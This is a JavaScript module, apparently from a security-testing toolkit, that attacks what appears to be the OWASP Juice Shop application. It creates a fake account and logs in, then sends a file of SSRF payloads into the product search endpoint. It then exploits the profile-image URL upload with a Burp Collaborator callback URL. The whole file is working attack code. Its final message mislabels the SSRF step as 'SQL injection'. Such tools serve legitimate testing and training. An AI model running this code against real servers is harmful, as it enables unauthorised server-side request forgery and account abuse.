//ojqweoim23edjkl2ndo23mdi203dm23.burpcollaborator.net

const  ora = require('ora')
const chalk = require('chalk');
const logSymbols= require('log-symbols');
const { http } = require('../lib/request')
const fs = require('fs');
const { faker } = require('@faker-js/faker');

const threshold = 100;


async function createAndLogin(targetURL){
    let info =  {
        email: faker.internet.email() ,
        password: faker.internet.password(),
        token: null
    }
    //create a valid user
    await http().post(targetURL + '/api/Users', {
        "email": info.email,
        "password": info.password,
        "passwordRepeat":info.password,
        "securityQuestion": {
            "id":1,
            "question":"Mother\'s maiden name?",
            "createdAt":"2023-04-13T14:08:40.000Z",
            "updatedAt":"2023-04-13T14:08:40.000Z"
        },
        "securityAnswer":"bla"
    });

    auth = await http().post(targetURL + '/rest/user/login',{
        "email": info.email,
        "password": info.password
    });
    //console.log(auth);
    info.token = auth.data.authentication.token;
    return info;
}   

async function basic1(targetURL){

    const spinner = ora('Running basic unsuccessful SSRF attacks').start();

    let ssrf_payloads = fs.readFileSync(__dirname + '/ssrf-payloads.txt', {encoding:'utf8'});
        ssrf_payloads = ssrf_payloads.split("\n");

    
    for (const payload of ssrf_payloads) {
        spinner.text = 'Basic SSRF Injection: ' + payload;
        await http().get(targetURL + '/rest/products/search',{
            q: payload
            
        })
        await new Promise(r => setTimeout(r, 100));
    }

    spinner.stopAndPersist({
                    symbol: logSymbols.success,
                    text: 'Basic SSRF injection attack - done',
                });
   
}

async function exploit(targetURL){
    const spinner = ora('Running successful SSRF injection attack').start();

    let info = await createAndLogin(targetURL)

    await new Promise(r => setTimeout(r, 2000));
    payload = "https://ojqweoim23edjkl2ndo23mdi203dm23.burpcollaborator.net:443/"
    spinner.text = 'Successful SSRF Injection: ' + payload;

    const form = new FormData();
    form.append('imageUrl',payload);

    const config = {
        method: 'POST',
        url: targetURL + '/profile/image/url',
        headers: {
            'Cookie': "token=" + info.token,
            'Authorization': 'Bearer '+info.token,
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        // data : {
        //     imageUrl: payload
        // }
        data: form
        //maxRedirects:0
    };
    let res = await http().custom(config)
    // console.log(res.response);
    await new Promise(r => setTimeout(r, 1000));
    spinner.stopAndPersist({
        symbol: logSymbols.success,
        text: 'Successful SQL injection attack - done',
    });

    
  
}

module.exports = { createAndLogin, basic1, exploit }